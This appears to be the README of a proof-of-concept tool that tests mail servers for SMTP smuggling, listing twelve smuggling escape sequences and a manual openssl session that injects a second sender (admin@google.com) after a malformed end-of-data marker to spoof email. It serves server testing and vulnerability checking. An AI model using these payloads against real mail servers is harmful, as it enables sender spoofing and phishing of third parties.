# smtp_smuggling_checker.py
### smtp smuggling testing tool with tls / starttls support

### Infos:
> [!NOTE]
https://www.postfix.org/smtp-smuggling.html
> 
> https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/

<hr>

## How to use:

```python
       _____  __  ___ ______ ____     _____                                  __               ____   ____   ______
      / ___/ /  |/  //_  __// __ \   / ___/ ____ ___   __  __ ____ _ ____ _ / /___   _____   / __ \ / __ \ / ____/
      \__ \ / /|_/ /  / /  / /_/ /   \__ \ / __ `__ \ / / / // __ `// __ `// // _ \ / ___/  / /_/ // / / // /     
     ___/ // /  / /  / /  / ____/   ___/ // / / / / // /_/ // /_/ // /_/ // //  __// /     / ____// /_/ // /___   
    /____//_/  /_/  /_/  /_/       /____//_/ /_/ /_/ \__,_/ \__, / \__, //_/ \___//_/     /_/     \____/ \____/   
                                                           /____/ /____/                                          
    
    SMTP Smuggle PoC Script v0.1 for checking mailservers - 2024 - by suuhmer

    
usage: smtp_poc.py [-h] [--server SERVER] [--port PORT] [--user USER] [--rcpt RCPT] [--mode MODE] [--forcetls]

Test you mailserver for SMTP Smuggle /w STARTTLS und AUTH PLAIN login.

options:
  -h, --help       show this help message and exit
  --server SERVER  SMTP-(Servername, Domain or IP
  --port PORT      SMTP-Serverport (Use 5870000 for 587 NOSSL-FALLBACK)
  --user USER      SMTP-userername
  --rcpt RCPT      rcpt address
  --mode MODE      Rawmode = raw or Default = def
  --forcetls       Force connection via SSL/TLS

```


#### Run the script like this:

```bash
# Example : You have to setup the Parameters with the right values!

# Sending via extern SMTP server with STARTTLS support and PLAIN AUTH login (The asking for password will prompt!):
.\smtp_smuggler_poc.py --server mail.server.com --port 587 --user user@yourserver.com --rcpt vic@yourserver.com --mode def --forcetls

# Sending via local SMTP server with STARTTLS forced on port 25 and default login credential in RAW sending mode (telnet socket mode):
.\smtp_smuggler_poc.py --server localhost --port 25 --rcpt vic@yourserver.com --mode raw --forcetls
```

<hr>

> [!NOTE]
> ### Beware this is alpha POC !! tested with postfix and python3
>
> 
<hr>

### Testing of postfix mailserver for example (localhost port 25 auth plain login (optional)):
![grafik](https://github.com/suuhm/smtp_smuggling_checker.py/assets/11504990/f46c47ed-8cd7-4395-9d2e-12589a505e21)

<hr>

### Testing these 12 payload strings:
##### Smgggling Strings (0-11):

- 0 - smtp_smuggle_escape = '\r\n.\r'
- 1 - smtp_smuggle_escape = '\r.\r'
- 2 - smtp_smuggle_escape = '\r\n\x00.\r'
- 3 - smtp_smuggle_escape = '\r\n\x00.\n'
- 4 - smtp_smuggle_escape = \r\n\x00.\r\n
- 5 - smtp_smuggle_escape = \r\n.\x00\r\n
- 6 - smtp_smuggle_escape = '\r\n.'
- 7 - smtp_smuggle_escape = \n.\r\n
- 8 - smtp_smuggle_escape = \r.\r\n
- 9 - smtp_smuggle_escape = \n\n.\r\n
- 10 - smtp_smuggle_escape = \r\n.\r
- 11 - smtp_smuggle_escape = \n.\n

<hr>


### Using telnet / openssl client for TLS

```bash
# Get base64 auth String:
# echo -n -e "\000info@myserver.com\000MYPASSWORD" | base64
#

openssl s_client -starttls smtp -crlf -connect mail.myserver.com:587 -tls1_2

EHLO myserver.com

AUTH PLAIN <YOU_BASE_64_STRING>

mail From: info@myserver.com

rcpt To: test@google.de

DATA
354 End data with <CR><LF>.<CR><LF>
From: test <it@google.de>
To: bla <jadu@foo.de>
Subject: Test1
bodyy Test1
<CR><LF>.<CR>
mail From: admin@google.com
rcpt To: jadu@foo.de
data
From: hallo admin <it@google.de>
To: gege <jadu@aniwe.de>
Subject: hallooooo
bodyyhacked
<CR><LF>.<CR><LF>
```

